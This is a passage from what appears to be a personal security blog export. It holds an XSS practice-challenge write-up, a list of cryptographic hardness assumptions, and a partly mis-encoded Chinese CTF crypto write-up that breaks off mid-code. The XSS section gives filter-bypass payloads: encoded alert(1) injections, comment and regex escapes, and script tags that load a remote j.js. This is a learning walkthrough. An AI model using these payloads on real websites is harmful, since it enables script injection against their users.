<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x02.png" class="" title="0x02">



<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>Filtrate the <code>[()]</code>.  <strong>&#96; to bypass.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x03.png" class="" title="0x03">



<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p><strong>html code bypass.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>

<p>Use burpsuite to encode the html. </p>
<img src="/2022/12/30/22-12-30-XSS/0x04-0.png" class="" title="0x04-0">

<img src="/2022/12/30/22-12-30-XSS/0x04-1.png" class="" title="0x04-1">



<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p><strong>Comment bypass.</strong> </p>
<p>There are two ways to comment for html. </p>
<ul>
<li><code>&lt;!-- comment --&gt;</code></li>
<li><code>&lt;!-- comment --!&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comment1 --!&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;!-- comment2</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x05.png" class="" title="0x05">



<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>Regex matching, <strong>line break bypass</strong>.</p>
<img src="/2022/12/30/22-12-30-XSS/0x06-0.png" class="" title="0x06-0">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type = &quot;image&quot; src=&quot;&quot; onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x06-1.png" class="" title="0x06-1">



<h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p><strong>HTML single-tag parsing.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x07-0.png" class="" title="0x07-0">

<img src="/2022/12/30/22-12-30-XSS/0x07.png" class="" title="0x07">



<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><ul>
<li><strong>Regex escape</strong>, the label to be closed add a space to escape.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x08-1.png" class="" title="0x08-1">

<ul>
<li><strong>Regex canâ€™t match the space.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x08-0.png" class="" title="0x08-0">

<img src="/2022/12/30/22-12-30-XSS/0x08-2.png" class="" title="0x08-2">



<h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><p>Include the website. </p>
<ul>
<li><strong>â€œâ€ ending bypass with IMG label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com &quot;&gt;&lt;/script&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x09-1.png" class="" title="0x09-1">

<ul>
<li><strong>add a character and â€œâ€ ending bypass.</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com1&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x09-2.png" class="" title="0x09-2">



<h1 id="0x0a"><a href="#0x0a" class="headerlink" title="0x0a"></a>0x0a</h1><blockquote>
<p>Failed! Donâ€™t know why. </p>
</blockquote>
<ul>
<li><strong>Import the target file to complete the XSS.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com.haozi.me/j.js</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0a.png" class="" title="0x0a">

<ul>
<li>the end of url add @target url</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@https://www.xxx.com/j.js</span><br></pre></td></tr></table></figure>

<p><em>Make sure that the target url is <code>https</code>.</em></p>
<h1 id="0x0b"><a href="#0x0b" class="headerlink" title="0x0b"></a>0x0b</h1><p>IMG label and html encode. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0b.png" class="" title="0x0b">



<h1 id="0x0c"><a href="#0x0c" class="headerlink" title="0x0c"></a>0x0c</h1><ul>
<li><p>Same above. </p>
</li>
<li><p>The anterior and posterior deformities are constructed.</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sscriptcript src=https://www.segmentfault.com.haozi.me/j.js&gt;&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x0d"><a href="#0x0d" class="headerlink" title="0x0d"></a>0x0d</h1><p><strong><code>Enter</code> break the comment structure.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1) </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0d.png" class="" title="0x0d">



<h1 id="0x0e"><a href="#0x0e" class="headerlink" title="0x0e"></a>0x0e</h1><p>Think reverse, find the character <strong>Å¿</strong> which means <code>s</code>. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Å¿cript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x0f"><a href="#0x0f" class="headerlink" title="0x0f"></a>0x0f</h1><p>HTML encode. End the code and comment at last. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;); alert(1) //</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x0f.png" class="" title="0x0f">



<h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p>No filtration. Just bypass. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;;alert(1);</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x10.png" class="" title="0x10">



<h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p><strong><code>//</code>is escaped, but it still runs at <code>//</code> in fact.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;);alert(1);//</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x11.png" class="" title="0x11">



<h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><ul>
<li><strong>Escape the escape character.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&quot;); alert(1); //</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x12-1.png" class="" title="0x12-1">



<ul>
<li><strong>Embed label inline.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt; &lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x12-2.png" class="" title="0x12-2">
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>penetration</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Description-About-Common-Difficult-Problems-in-Cryptography</title>
    <url>/2023/03/02/Description-about-common-difficult-problems-in-cryptography/</url>
    <content><![CDATA[<p>Descriptions about the common difficult problems in cryptography.</p>
<p>I will learn about them in the nearly future. </p>
<span id="more"></span><!--toc-->



<blockquote>
<p><a href="https://web.archive.org/web/20120121090326/http://www.ecrypt.eu.org/wiki/index.php/Main_Page">web.archive.org</a></p>
</blockquote>
<h1 id="Discrete-logarithm-problem"><a href="#Discrete-logarithm-problem" class="headerlink" title="Discrete logarithm problem"></a>Discrete logarithm problem</h1><ul>
<li>DLP: discrete logarithm problem</li>
<li>CDH: computational Diffie-Hellman problem</li>
<li>SDH: static Diffie-Hellman problem</li>
<li>gap-CDH: Gap Diffie-Hellman problem</li>
<li>DDH: decision Diffie-Hellman problem</li>
<li>Strong-DDH: strong decision Diffie-Hellman problem</li>
<li>sDDH: skewed decision Diffie-Hellman problem</li>
<li>PDDH: parallel decision Diffie-Hellman problem</li>
<li>Square-DH: Square Diffie-Hellman problem</li>
<li>l-DHI: l-Diffie-Hellman inversion problem</li>
<li>l-DDHI: l-Decisional Diffie-Hellman inversion problem</li>
<li>REPRESENTATION: Representation problem</li>
<li>LRSW: LRSW Problem</li>
<li>Linear: Linear problem</li>
<li>D-Linear1: Decision Linear problem (version 1)</li>
<li>l-SDH: l-Strong Diffie-Hellman problem</li>
<li>c-DLSE: Discrete Logarithm with Short Exponents</li>
<li>CONF: (conference-key sharing scheme)</li>
<li>3PASS: 3-Pass Message Transmission Scheme</li>
<li>LUCAS: Lucas Problem</li>
<li>XLP: x-Logarithm Problem</li>
<li>MDHP: Matching Diffie-Hellman Problem</li>
<li>DDLP: Double Discrete Logarithm Problem</li>
<li>rootDLP: Root of Discrete Logarithm Problem</li>
<li>n-M-DDH: Multiple Decision Diffie-Hellman Problem</li>
<li>l-HENSEL-DLP: l-Hensel Discrete Logarithm Problem</li>
<li>DLP(Inn(G)): Discrete Logarithm Problem over Inner Automorphism Group</li>
<li>IE: Inverse Exponent</li>
<li>TDH: The Twin Diffie-Hellman Assumption</li>
<li>XTR-DL: XTR discrete logarithm problem</li>
<li>XTR-DH: XTR Diffie-Hellman problem</li>
<li>XTR-DHD: XTR decision Diffie-Hellman problem</li>
<li>CL-DLP: discrete logarithms in class groups of imaginary quadratic orders</li>
<li>TV-DDH: Tzeng Variant Decision Diffie-Hellman problem</li>
<li>n-DHE: n-Diffie-Hellman Exponent problem</li>
</ul>
<h1 id="Factoring"><a href="#Factoring" class="headerlink" title="Factoring"></a>Factoring</h1><ul>
<li>FACTORING: integer factorisation problem</li>
<li>SQRT: square roots modulo a composite</li>
<li>CHARACTERd: character problem</li>
<li>MOVAd: character problem</li>
<li>CYCLOFACTd: factorisation in Z[Î¸]</li>
<li>FERMATd: factorisation in Z[Î¸]</li>
<li>RSAP: RSA problem</li>
<li>Strong-RSAP: strong RSA problem</li>
<li>Difference-RSAP: Difference RSA problem</li>
<li>Partial-DL-ZN2P: Partial Discrete Logarithm problem in Zâˆ—n</li>
<li>DDH-ZN2P: Decision Diffie-Hellman problem over Zâˆ—n</li>
<li>Lift-DH-ZN2P: Lift Diffie-Hellman problem over Zâˆ—n</li>
<li>EPHP: Election Privacy Homomorphism problem</li>
<li>AERP: Approximate e-th root problem l-HENSEL-RSAP: l-Hensel RSA</li>
<li>DSeRP: Decisional Small e-Residues in Zâˆ—n2</li>
<li>DS2eRP: Decisional Small 2e-Residues in Zâˆ—n2</li>
<li>DSmallRSAKP: Decisional Reciprocal RSA-Paillier in Zâˆ—n2 HRP: Higher Residuosity Problem</li>
<li>ECSQRT: Square roots in elliptic curve groups over Z&#x2F;nZ</li>
<li>RFP: Root Finding Problem</li>
<li>phiA: PHI-Assumption</li>
<li>C-DRSA: Computational Dependent-RSA problem</li>
<li>D-DRSA: Decisional Dependent-RSA problem</li>
<li>E-DRSA: Extraction Dependent-RSA problem</li>
<li>DCR: Decisional Composite Residuosity problem</li>
<li>CRC: Composite Residuosity Class problem</li>
<li>DCRC: Decisional Composite Residuosity Class problem</li>
<li>GenBBS: generalised Blum-Blum-Shub assumption</li>
</ul>
<h1 id="Product-groups"><a href="#Product-groups" class="headerlink" title="Product groups"></a>Product groups</h1><ul>
<li>co-CDH: co-Computational Diffie-Hellman Problem</li>
<li>PG-CDH: Computational Diffie-Hellman Problem for Product Groups</li>
<li>XDDH: External Decision Diffie-Hellman Problem</li>
<li>D-Linear2: Decision Linear Problem (version 2)</li>
<li>PG-DLIN: Decision Linear Problem for Product Groups</li>
<li>FSDH: Flexible Square Diffie-Hellman Problem</li>
<li>KSW1: Assumption 1 of Katz-Sahai-Waters</li>
</ul>
<h1 id="Pairings"><a href="#Pairings" class="headerlink" title="Pairings"></a>Pairings</h1><ul>
<li>BDHP: Bilinear Diffie-Hellman Problem</li>
<li>DBDH: Decision Bilinear Diffie-Hellman Problem</li>
<li>B-DLIN: Bilinear Decision-Linear Problem</li>
<li>l-BDHI: l-Bilinear Diffie-Hellman Inversion Problem</li>
<li>l-DBDHI: l-Bilinear Decision Diffie-Hellman Inversion Problem</li>
<li>l-wBDHI: l-weak Bilinear Diffie-Hellman Inversion  Problem</li>
<li>l-wDBDHI: l-weak Decisional Bilinear Diffie-Hellman Inversion Problem</li>
<li>KSW2: Assumption 2 of Katz-Sahai-Waters</li>
<li>MSEDH: Multi-sequence of Exponents Diffie-Hellman Assumption</li>
</ul>
<h1 id="Lattices"><a href="#Lattices" class="headerlink" title="Lattices"></a>Lattices</h1><h2 id="Main-Lattice-Problems"><a href="#Main-Lattice-Problems" class="headerlink" title="Main Lattice Problems"></a>Main Lattice Problems</h2><ul>
<li>SVPÎ³p: (Approximate) Shortest vector problem</li>
<li>CVPpÎ³: (Approximate) Closest vector problem</li>
<li>GapSVPpÎ³: Decisional shortest vector problem</li>
<li>GapCVPpÎ³: Decisional closest vector problem</li>
</ul>
<h2 id="Modular-Lattice-Problems"><a href="#Modular-Lattice-Problems" class="headerlink" title="Modular Lattice Problems"></a>Modular Lattice Problems</h2><ul>
<li>SISp(n,m,q,Î²): Short integer solution problem</li>
<li>ISISp(n,m,q,Î²): Inhomogeneous short integer solution problem</li>
<li>LWE(n,q,Ï†): Learning with errors problem</li>
</ul>
<h2 id="Miscellaneous-Lattice-Problems"><a href="#Miscellaneous-Lattice-Problems" class="headerlink" title="Miscellaneous Lattice Problems"></a>Miscellaneous Lattice Problems</h2><ul>
<li>USVPp(n,Î³): Approximate unique shortest vector problem</li>
<li>SBPp(n,Î³): Approximate shortest basis problem</li>
<li>SLPp(n,Î³): Approximate shortest length problem</li>
<li>SIVPp(n,Î³): Approximate shortest independent vector problem</li>
<li>hermiteSVP: Hermite shortest vector problem</li>
<li>CRP: Covering radius problem</li>
</ul>
<h2 id="Ideal-Lattice-Problems"><a href="#Ideal-Lattice-Problems" class="headerlink" title="Ideal Lattice Problems"></a>Ideal Lattice Problems</h2><ul>
<li>Ideal-SVPf,pÎ³: (Approximate) Ideal shortest vector problem &#x2F; Shortest polynomial problem</li>
<li>Ideal-SISf,p q,m,Î²: Ideal small integer solution problem</li>
</ul>
<h1 id="Miscellaneous-Problems"><a href="#Miscellaneous-Problems" class="headerlink" title="Miscellaneous Problems"></a>Miscellaneous Problems</h1><ul>
<li>KEA1: Knowledge of Exponent assumption</li>
<li>MQ: Multivariable Quadratic equations</li>
<li>CF: Given-weight codeword finding</li>
<li>ConjSP: Braid group conjugacy search problem</li>
<li>GenConjSP: Generalised braid group conjugacy search problem</li>
<li>ConjDecomP: Braid group conjugacy decomposition problem</li>
<li>ConjDP: Braid group conjugacy decision problem</li>
<li>DHCP: Braid group decisional Diffie-Hellman-type conjugacy problem</li>
<li>ConjSearch: (multiple simlutaneous) Braid group conjugacy search problem</li>
<li>SubConjSearch: subgroup restricted Braid group conjugacy search problem</li>
<li>LINPOLY : A linear algebra problem on polynomials<br>HFE-DP: Hidden Field Equations Decomposition Problem</li>
<li>HFE-SP: Hidden Field Equations Solving Problem</li>
<li>MKS: Multiplicative Knapsack</li>
<li>BP: Balance Problem</li>
<li>AHA: Adaptive Hardness Assumptions</li>
<li>SPI: Sparse Polynomial Interpolation</li>
<li>SPP: Self-Power Problem</li>
<li>VDP: Vector Decomposition Problem</li>
<li>2-DL: 2-generalized Discrete Logarithm Problem</li>
</ul>
<h1 id="Problem-Details"><a href="#Problem-Details" class="headerlink" title="Problem Details"></a>Problem Details</h1><p>The full paper provides details about each assumption. Here is an example entry:</p>
<h2 id="CDH-computational-Diffie-Hellman-problem"><a href="#CDH-computational-Diffie-Hellman-problem" class="headerlink" title="CDH: computational Diffie-Hellman problem"></a>CDH: computational Diffie-Hellman problem</h2><ul>
<li><p>Definition :<br>Given ga,gbâˆˆG to compute gab.</p>
</li>
<li><p>Reductions:<br>CDH â‰¤p DLP<br>DLP â‰¤subexp CDH in groups of squarefree order.</p>
</li>
<li><p>Algorithms:<br>The best known algorithm for CDH is to actually solve the DLP.</p>
</li>
</ul>
<p>Use in cryptography: Diffie-Hellman key exchange and variants, Elgamal encryption and variants, BLS signatures and variants.</p>
<ul>
<li><p>History:<br>Discovered by W. Diffie and M. Hellman.</p>
</li>
<li><p>Remark:<br>A variant of CDH is: Given g0,ga0,gb0âˆˆG to compute gab0. This is â‰¡p CDH.</p>
</li>
<li><p>References:</p>
<ul>
<li>W. Diffie and M. E. Hellman, New directions in cryptography, IEEE Transactions on Information Theory, vol. IT-22, No. 6, Nov. 1976, p. 644-654</li>
<li>U.M. Maurer and S. Wolf, Diffie-Hellman Oracles, 	Proceedings of CRYPTO â€™96, p. 268-282.</li>
<li>D. Boneh and R.J. Lipton Algorithms for Black-Box Fields and Applications to Cryp- tography, Proceedings of CRYPTO â€™96, p. 283-297.</li>
<li>The complete text is far too long to copy paste here, but this provides a pretty good example of how extensive and thorough it is.</li>
</ul>
</li>
</ul>
<h1 id="Addendum-Unlisted-Problem-s"><a href="#Addendum-Unlisted-Problem-s" class="headerlink" title="Addendum: Unlisted Problem(s)"></a>Addendum: Unlisted Problem(s)</h1><p>The following problem(s) were not listed in the above - - </p>
<ul>
<li>reference:<ul>
<li>MIHNP: Modular Inversion Hidden Number Problem</li>
<li>AGCD: Approximate Greatest Common Divisor</li>
<li>SIP: Small Inverse Problem</li>
</ul>
</li>
</ul>
<h2 id="Subset-Sum-x2F-Knapsack-problem"><a href="#Subset-Sum-x2F-Knapsack-problem" class="headerlink" title="Subset Sum&#x2F;Knapsack problem"></a>Subset Sum&#x2F;Knapsack problem</h2><ul>
<li>Subset Sum problem<ul>
<li>(0,1) knapsack problem (The standard version of the problem)</li>
</ul>
</li>
<li>Bounded knapsack problem<br>Unbounded knapsack problem</li>
<li>RMSS: Random Modular Subset Sum</li>
</ul>
<h2 id="Note-about-parameters"><a href="#Note-about-parameters" class="headerlink" title="Note about parameters"></a>Note about parameters</h2><p>Hardness assumptions only hold when parameterized correctly. Inappropriate parameters can lead to easily solved instances of hard problems.</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>definition</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-Write-Up-Zh</title>
    <url>/2023/03/09/Crypto-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording. </p>
<p>Timelines are <strong>from new to old</strong>.</p>
<span id="more"></span><!--toc-->

<h1 id="DASCTF-2023-amp-0X401-ezAlgebra"><a href="#DASCTF-2023-amp-0X401-ezAlgebra" class="headerlink" title="[DASCTF 2023 &amp; 0X401]ezAlgebra"></a>[DASCTF 2023 &amp; 0X401]ezAlgebra</h1><ul>
<li>Coppersmith-å·²çŸ¥é«˜ä½æ”»å‡»</li>
<li>æ–¹ç¨‹ç»„æ±‚è§£-groebner_basis()</li>
</ul>
<p>$$<br>n &#x3D; p\times q\times r<br>$$</p>
<p>$$<br>c_1 \equiv (t+p)^{4} + (t+p)^{3} + (t+p)^{2} + (t+p) + 1997 \mod n<br>$$</p>
<p>$$<br>c_2 \equiv (mt)^{19} + (mt)^{18} + \cdots +(mt)^{2} + (mt) + 1997 \mod q<br>$$</p>
<p>$$<br>c_3 \equiv (m+t)^{19} + (m+t)^{18}+\cdots + (m+t)^{2} + (m+t) + 1997 \mod q<br>$$</p>
<p>å› ä¸º$\mod n \rightarrow \mod q $ï¼Œæ‰€ä»¥å¯¹å…¬å¼è¿›è¡Œå˜å½¢å¯ä»¥å¾—åˆ°ï¼š<br>$$<br>\Longrightarrow kp &#x3D; c_1 - (t^{4} + t^{3} + t^{2} + t + 1997)<br>$$</p>
<h2 id="Coppersmith-å·²çŸ¥é«˜ä½æ”»å‡»"><a href="#Coppersmith-å·²çŸ¥é«˜ä½æ”»å‡»" class="headerlink" title="Coppersmith-å·²çŸ¥é«˜ä½æ”»å‡»"></a>Coppersmith-å·²çŸ¥é«˜ä½æ”»å‡»</h2><p>æ­¤å¤„æˆ‘ä»¬å‡è®¾$(t + p)$ä¸ºæœªçŸ¥æ•°ï¼Œåˆ©ç”¨å¤šé¡¹å¼ç¯è¿›è¡Œæ±‚è§£ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x^4 + x^3 + x^2 + x + 1997 - c1</span><br><span class="line">t = f.small_roots(X = 2 ^ 32, beta = 0.4)[0]</span><br><span class="line"># print(t)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>small_roots(X, beta)</code></p>
<ul>
<li><code>X</code>ä¸ºè¯¥å¼çš„éœ€è¦æ±‚è§£æ ¹çš„ä¸Šé™ï¼›è™½ç„¶æ˜¯æ ¹çš„ä¸Šé™ï¼Œå¹¶ä¸æ˜¯è¯´ä¸Šé™è¶Šé«˜è¶Šå¥½ï¼Œå½“ä¸Šé™è¶…è¿‡æŸä¸ªå€¼çš„æ—¶å€™å°±ä¼šè®¡ç®—å¤±æ•ˆï¼Œå³ä½¿å·²çŸ¥äºŒè¿›åˆ¶ä½æ•°æ»¡è¶³æ¡ä»¶ï¼Œä¹Ÿæ— æ³•ç”¨æ­¤å‡½æ•°æ±‚å¾—ç»“æœï¼›æ‰€ä»¥ä¸€èˆ¬æ¥è¯´<code>X</code>å–åœ¨ç»™å®šæƒ…å†µä¸‹çš„æœ€å¤§æ±‚è§£ä¸Šé™ã€‚</li>
<li><code>beta</code>ï¼Œå½“p,qäºŒè¿›åˆ¶ä½æ•°ç›¸åŒæ—¶ä¸€èˆ¬åªèƒ½å–$0.4$ï¼›å¦‚æœp,qäºŒè¿›åˆ¶ä½æ•°ä¸åŒï¼Œå°±æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•å…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚$p,q \ge n^{\beta}$</li>
</ul>
</li>
<li><p>ç»è¿‡æµ‹è¯•å¾—åˆ°ï¼Œå½“æœªçŸ¥é‡å°äºç­‰äº$454bits$æ—¶ï¼ˆ$p$,$q$ä¸º$1024bits$ï¼‰ï¼Œcoppersmithå®šç†å¯ä»¥æ±‚è§£ã€‚</p>
</li>
</ul>
<p>$$<br>gcd(kp, n) &#x3D; p<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">kp = t^<span class="number">4</span> + t^<span class="number">3</span> + t^<span class="number">2</span> + t + <span class="number">1997</span> - c1</span><br><span class="line">p = gcd(mpz(kp), mpz(n))</span><br><span class="line">qr = n // p</span><br><span class="line"><span class="keyword">assert</span> isPrime(p)</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œåˆ©ç”¨å€æ•°å…³ç³»ï¼Œç›´æ¥æŠŠ$p$åˆ©ç”¨<code>gcd()</code>å‡½æ•°è¿›è¡Œæ±‚è§£ã€‚</p>
<h2 id="æ–¹ç¨‹ç»„æ±‚è§£-groebner-basis"><a href="#æ–¹ç¨‹ç»„æ±‚è§£-groebner-basis" class="headerlink" title="æ–¹ç¨‹ç»„æ±‚è§£-groebner_basis()"></a>æ–¹ç¨‹ç»„æ±‚è§£-groebner_basis()</h2><p>åŒæ ·çš„æ“ä½œï¼Œè®¾ç½®æœªçŸ¥æ•°ã€‚</p>
<p>åˆ©ç”¨<code>groebner_basis()</code>å‡½æ•°è¿›è¡Œæ±‚è§£ï¼Œæ­¤æ—¶å¿…é¡»ä¸‰ä¸ªæ–¹ç¨‹æ‰èƒ½æ±‚è§£å¯¹åº”æœªçŸ¥é‡ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P.&lt;x, t&gt; = PolynomialRing(Zmod(qr))</span><br><span class="line">f1 = t - 2915836867</span><br><span class="line">f2 = 1997 - c2</span><br><span class="line">f3 = 1997 - c3</span><br><span class="line">for i in range(1, 20):</span><br><span class="line">    f2 += (x * t) ^ i</span><br><span class="line">    f3 += (x + t) ^ i</span><br><span class="line">G = [f1, f2, f3]</span><br><span class="line">I = Ideal(G)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">print(B)</span><br><span class="line">res = [i.constant_coefficient() for i in B]</span><br><span class="line">print(res)</span><br><span class="line">q = int(res[2])</span><br><span class="line">m = int(-res[0] % q)</span><br><span class="line">tt = -res[1] % q</span><br><span class="line">print(q)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>æ±‚å‡ºmè½¬å­—ç¬¦ï¼Œå‘ç°å¾—ä¸åˆ°ç»“æœï¼Œç»“æœæ˜¯m % qï¼ŒçŒœæµ‹æ¯”qå¤§ï¼Œçˆ†ç ´ä¸€ä¸‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000000</span>):</span><br><span class="line">    v = long_to_bytes(m + i * q)</span><br><span class="line">    <span class="comment"># if b&#x27;ctf&#x27; in v:</span></span><br><span class="line">    <span class="comment">#     print(v)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0x20</span> &lt;= k &lt; <span class="number">0x7f</span> <span class="keyword">for</span> k <span class="keyword">in</span> v):</span><br><span class="line">        <span class="built_in">print</span>(v,i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h1 id="DASCTF-2023-amp-0X401-ezRSA"><a href="#DASCTF-2023-amp-0X401-ezRSA" class="headerlink" title="[DASCTF 2023 &amp; 0X401]ezRSA"></a>[DASCTF 2023 &amp; 0X401]ezRSA</h1><ul>
<li>coppersmith-å·²çŸ¥é«˜ä½æ±‚è§£p</li>
<li>Franklin Reiter ç›¸å…³ä¿¡æ¯æ”»å‡»</li>
</ul>
<h2 id="coppersmith-å·²çŸ¥é«˜ä½æ±‚è§£p"><a href="#coppersmith-å·²çŸ¥é«˜ä½æ±‚è§£p" class="headerlink" title="coppersmith-å·²çŸ¥é«˜ä½æ±‚è§£p"></a>coppersmith-å·²çŸ¥é«˜ä½æ±‚è§£p</h2><p>$$<br>gift &#x3D; P (Q &gt;&gt; 16)<br>$$</p>
<p>$$<br>c_1 &#x3D; pow(n, e, N) \equiv n^{e} \mod N<br>$$</p>
<p>$$<br>c_2 &#x3D; pow(secret, e, N) \equiv secret^{e} \mod N<br>$$</p>
<p>$$<br>c_3 &#x3D; pow(flag, e, n) \equiv flag^{e} \mod N<br>$$</p>
<p>*å·²çŸ¥ï¼Œ$N$,$gift$,$c_1$,$c_2$,$c_3$*ï¼Œæ±‚è§£<code>flag</code>ã€‚</p>
<p>åªèƒ½ä»giftå…¥æ‰‹ï¼ŒPé«˜16ä½å·²çŸ¥ï¼ŒåˆN &#x3D; P * Q ï¼Œé‚£ä¹ˆQçš„é«˜ä½ä¹Ÿèƒ½å¾—å‡ºï¼Œè€ƒè™‘åˆ°è¿›ä½é—®é¢˜ï¼Œå¯ä»¥å°†Qçš„é«˜ä½ä½æ•°æ±‚å°ä¸€ç‚¹ï¼ˆå‡è®¾ä¸ºxï¼‰ï¼Œä¹‹åå†æ ¹æ®Qçš„é«˜ä½å’Œå¼‚æˆ–æ€§è´¨ï¼Œåˆèƒ½æ±‚å‡ºPçš„é«˜16 + xä½ï¼Œè¿™é‡Œå–x &#x3D; 10ï¼Œå¦‚æ­¤å¾ªç¯å¾€å¤ï¼Œæœ€åå¤§æ¦‚å‰©6æ¯”ç‰¹æ²¡æ¢å¤ï¼Œæšä¸¾ä¸‹å³å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">P_h = gift &gt;&gt; (512 - 16)</span><br><span class="line"></span><br><span class="line"># def find_p(p, q, q_):</span><br><span class="line">#     if len(p) == (512 - 16):</span><br><span class="line">#         pp = int(p, 2) + P_h * 2 ** (512 - 16)</span><br><span class="line">#         if gcd(N, pp) &gt; 1:</span><br><span class="line">#             print(pp)</span><br><span class="line">#             print(N//pp)</span><br><span class="line">#         else:</span><br><span class="line">#             l = len(p)</span><br><span class="line">#             pp = int(p, 2)</span><br><span class="line">#             qq = int(q, 2)</span><br><span 